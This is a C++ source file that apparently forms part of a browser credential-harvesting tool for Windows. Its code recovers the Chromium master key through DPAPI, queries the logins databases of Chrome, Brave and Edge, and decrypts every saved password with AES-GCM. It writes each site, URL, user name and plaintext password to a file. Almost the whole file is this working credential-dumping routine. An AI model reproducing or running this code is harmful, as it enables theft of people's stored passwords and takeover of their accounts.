/*
* Recently on Windows the system changed to a system more like the MacOS one: one 256 bit masterkey is stored 
(in a separate file called Local State in the app directory, base64 encoded and represented in JSON) as a DPAPI 
secret again and each password item is then a hex encoded, AES-GCM encrypted entry in the sqlite database in that 
same directory (all under that master key, but each with its own 12 byte nonce, and a 16 byte tag to protect 
integrity). So still it eventually depends on the user password credentials. Once the user password 
(or rather its SHA1 hash) is known, all entries are decryptable. As said, this is by design. 
Even Microsoft's Edge (Chromium edition) uses this system now
*/
#include "sqlite3.h"
#include "common.h"
#include "FileIO.h"
#include"../IO.h"

typedef SQLITE_API int (*sqli_openFn)
(const char* filename,   /* Database filename (UTF-8) */
	sqlite3** ppDb          /* OUT: SQLite db handle */);

typedef SQLITE_API int (*sqlite3_prepare_v2_Fn)
(sqlite3* db,            /* Database handle */
	const char* zSql,       /* SQL statement, UTF-8 encoded */
	int nByte,              /* Maximum length of zSql in bytes. */
	sqlite3_stmt** ppStmt,  /* OUT: Statement handle */
	const char** pzTail     /* OUT: Pointer to unused portion of zSql */);

typedef SQLITE_API int (*sqli_stepFn) (sqlite3_stmt*);

typedef SQLITE_API const unsigned char* (*sqli_columnTextFn)
(sqlite3_stmt*, int iCol);

typedef SQLITE_API const void* (*sqli_textBlobFn)
(sqlite3_stmt*, int iCol);

typedef SQLITE_API SQLITE_API int (*sqli_columnByetsFn)
(sqlite3_stmt*, int iCol);

typedef SQLITE_API const char* (*sqli_errmsgFn) (sqlite3*);

class SqlHelperClass final {
public:

	SqlHelperClass() = default;
	SqlHelperClass(std::string fileName, const std::string& currDirPath) : _fileName{std::move(fileName)}, currDirPathToSet { std::move(currDirPath) } {
}
	int PrintBrowseData() {

		if (!fileObj.is_open()) {
			fileObj.open(_fileName, ios::binary | ios::app);
		}
		__writeBrowserDataToFile(fileObj, "CHROME\n");
		//std::cout << "CHROME\n\n";	
		DecryptPasswordFor(CHROME);

		__writeBrowserDataToFile(fileObj, "BRAVE\n");
		//std::cout << "\n\nBRAVE\n\n";
		DecryptPasswordFor(BRAVE);
		__writeBrowserDataToFile(fileObj, "EDGE\n");
		//std::cout << "\n\nEDGE\n\n";
		DecryptPasswordFor(EDGE);
		fileObj.close();
		return 0;
	}

	virtual ~SqlHelperClass() {
		if (fileObj.is_open()) {
			fileObj.close();
		}
	}

private:
	void __writeBrowserDataToFile(ofstream& fileObj, std::string Data) {

		fileObj << Data << "\n";

	}

	DATA_BLOB* UnportectMasterKey(std::string MasterString)
	{
		// Base64 decode the key
		if (MasterString.length()) {
			std::string base64Key = MasterString;
			std::vector<unsigned char> binaryKey;
			DWORD binaryKeySize = 0;

			if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
			{
				std::cout << "[1] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
				return nullptr;
			}

			binaryKey.resize(binaryKeySize);
			if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
			{
				std::cout << "[2] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
				return nullptr;
			}

			// Decrypt the key
			DATA_BLOB in, out{};
			in.pbData = binaryKey.data() + 5;
			in.cbData = binaryKeySize - 5;

			if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
			{
				std::cout << "Failed to unprotect master key.\n";
				return nullptr;
			}

			// Allocate memory for the output DATA_BLOB pointer and return it

			DATA_BLOB* outPtr = new DATA_BLOB;
			outPtr->pbData = out.pbData;
			outPtr->cbData = out.cbData;
			return outPtr;
		}
		return nullptr;
	}

	std::string ParseMasterString(std::string data)
	{
		std::string secret_key;
		size_t idx = data.find("encrypted_key") + 16;
		while (idx < data.length() && data[idx] != '\"')
		{
			secret_key.push_back(data[idx]);
			idx++;
		}

		return secret_key;
	}

	DATA_BLOB* GetMasterKey(BROWSER browser)
	{
		FileIO::FileIO fileIOHelper;
		std::string localState = fileIOHelper.GetLocalState(browser);
		std::string localStateData = fileIOHelper.ReadFileToString(localState);
		std::string MasterString = ParseMasterString(localStateData);

		return UnportectMasterKey(MasterString);
	}

	std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB MasterKey)
	{
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		NTSTATUS status = 0;
		SIZE_T EncryptedBlobSize = EncryptedBlob.length();
		SIZE_T TagOffset = EncryptedBlobSize - 15;
		ULONG PlainTextSize = 0;

		std::vector<BYTE> CipherPass(EncryptedBlobSize);
		std::vector<BYTE> PlainText;
		std::vector<BYTE> IV(IV_SIZE);
		std::string pswString;

		// Parse iv and password from the buffer using std::copy
		//first 12 characters are IV that we extract from EncryptedBlob. we have added +3 becauese
		//EncryptedBlob is prefixed with “v10" string so want to skip that. So 3 + IV_SIZE (12) = 15
		//so from 3rd index to 14th index is IV
		if (EncryptedBlob.length() < 16) {
			pswString = "------------- Unable to get password --------------- ";
		}
		else {
			std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
			//then we extract ciphertext starting from 15th index to the end of the string.
			std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

			// Open algorithm provider for decryption
			//initializes a handle to the Windows algorithm provider.
			status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
			if (!BCRYPT_SUCCESS(status))
			{
				std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
				return "";
			}

			// Set chaining mode for decryption
			//sets the properties of the algorithm we are using, so in this case, AES with GCM mode.
			status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
			if (!BCRYPT_SUCCESS(status))
			{
				std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
				BCryptCloseAlgorithmProvider(hAlgorithm, 0);
				return "";
			}

			// The BCryptGenerateSymmetricKey function is a Windows API function that generates a symmetric 
			//key for use in symmetric cryptography operations.
			/*
			* The 5th and 6th parameters of the BCryptGenerateSymmetricKey function are the "secret" and "secret length"
			parameters, respectively.
			These parameters allow you to specify a secret value that is used as input to the key generation process.
			This can be used to generate keys that are derived from a shared secret between two parties,
			such as a Diffie-Hellman shared secret.
			*/
			status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
			if (!BCRYPT_SUCCESS(status))
			{
				std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
				BCryptCloseAlgorithmProvider(hAlgorithm, 0);
				return "";
			}

			// Auth cipher mode info
			BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
			BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
			TagOffset = TagOffset - 16;
			AuthInfo.pbNonce = IV.data();
			AuthInfo.cbNonce = IV_SIZE;
			//first 12 characters are IV data that is appended to cipher text
			//last 16 characters are authentication TAG value that is appended to cipher text
			//the remaining between data is password data that we actually need
			AuthInfo.pbTag = CipherPass.data() + TagOffset; //last 16 characters is TAG value
			AuthInfo.cbTag = TAG_SIZE;

			// Get size of plaintext buffer
			status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
			if (!BCRYPT_SUCCESS(status))
			{
				std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
				return "";
			}

			// Allocate memory for the plaintext
			if (PlainTextSize <= sizeof(int) * 10000001) {
				PlainText.resize(PlainTextSize);

				status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
				if (!BCRYPT_SUCCESS(status))
				{
					std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
					return "";
				}
				pswString = std::string(PlainText.begin(), PlainText.end());
			}
			else {
				pswString = "--- Error! Password to long to to hold in a vector. This might be "
					"because password is already stored in some hash by password --------------- ";
			}

			// Close the algorithm handle
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		}

		return pswString;
	}

	void DecryptPasswordFor(BROWSER browser)
	{
		FileIO::FileIO fileIOHelper;

		std::string DbPath = fileIOHelper.GetDbPath(browser);
		DATA_BLOB* MasterKey = GetMasterKey(browser);
		if (!MasterKey) {
			return;
		}

		SetCurrentDirectoryA(currDirPathToSet.data());

		char sqlDllFilePath[MAX_PATH] = { 0 };
		GetFullPathNameA("sqlite3.dll", MAX_PATH, sqlDllFilePath, NULL);

		HMODULE hSqlDllModule{ LoadLibrary(L"sqlite3.dll") };
		sqlite3* db = nullptr;
		std::string selectQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins";
		sqlite3_stmt* selectStmt = nullptr;

		sqli_errmsgFn err_msg = reinterpret_cast<sqli_errmsgFn>(GetProcAddress(hSqlDllModule, "sqlite3_errmsg"));


		// Open the database file
		sqli_openFn open_fn = reinterpret_cast<sqli_openFn>(GetProcAddress(hSqlDllModule, "sqlite3_open"));

		if (open_fn(DbPath.c_str(), &db) != SQLITE_OK) {
			std::cerr << "Failed to open database file: " << err_msg(db) << std::endl;
			return;
		}

		// Prepare the SELECT statement
		sqlite3_prepare_v2_Fn prepare_fn = reinterpret_cast<sqlite3_prepare_v2_Fn>(
			GetProcAddress(hSqlDllModule, "sqlite3_prepare_v2"));

		if (prepare_fn(db, selectQuery.c_str(), -1, &selectStmt, 0) != SQLITE_OK) {
			std::cerr << "Failed to prepare SELECT statement: " << err_msg(db) << std::endl;
			return;
		}
		// Iterate over the rows of the logins table
		sqli_stepFn step_fn = reinterpret_cast<sqli_stepFn>(
			GetProcAddress(hSqlDllModule, "sqlite3_step"));

		sqli_columnTextFn column_text_fn = reinterpret_cast<sqli_columnTextFn>(
			GetProcAddress(hSqlDllModule, "sqlite3_column_text"));

		sqli_textBlobFn column_blob_fn = reinterpret_cast<sqli_textBlobFn>(
			GetProcAddress(hSqlDllModule, "sqlite3_column_blob"));

		sqli_columnByetsFn column_bytes_fn = reinterpret_cast<sqli_columnByetsFn>(
			GetProcAddress(hSqlDllModule, "sqlite3_column_bytes"));

		while (step_fn(selectStmt) == SQLITE_ROW) {
			// Extract the values of the columns
			const char* website = reinterpret_cast<const char*>(column_text_fn(selectStmt, 0));
			const char* loginUrl = reinterpret_cast<const char*>(column_text_fn(selectStmt, 1));
			const char* userName = reinterpret_cast<const char*>(column_text_fn(selectStmt, 2));
			const char* passwordBlob = reinterpret_cast<const char*>(column_blob_fn(selectStmt, 3));
			int passwordBlobSize = column_bytes_fn(selectStmt, 3);

			if (passwordBlobSize > 0) {
				// Decrypt the password
				std::string pass = AESDecrypter(passwordBlob, *MasterKey);
				// Print the login information
				//std::cout << "Website: " << website << std::endl;
				__writeBrowserDataToFile(fileObj, std::string("Website: ") + website);
				__writeBrowserDataToFile(fileObj, std::string("Login URL: ") + loginUrl);
				__writeBrowserDataToFile(fileObj, std::string("User name: ") + userName);
				__writeBrowserDataToFile(fileObj, std::string("Password: ") + pass);
				//std::cout << "Login URL: " << loginUrl << std::endl;
				//std::cout << "User name: " << userName << std::endl;
				//std::cout << "Password: " << pass << std::endl;
			}
			else {
				// Print a message if the password is empty
				std::cout << "No password found for this login" << std::endl;
			}
		}

		delete MasterKey;
	}

	std::string currDirPathToSet{};
	ofstream fileObj{}; //browser data file
	std::string _fileName;
};
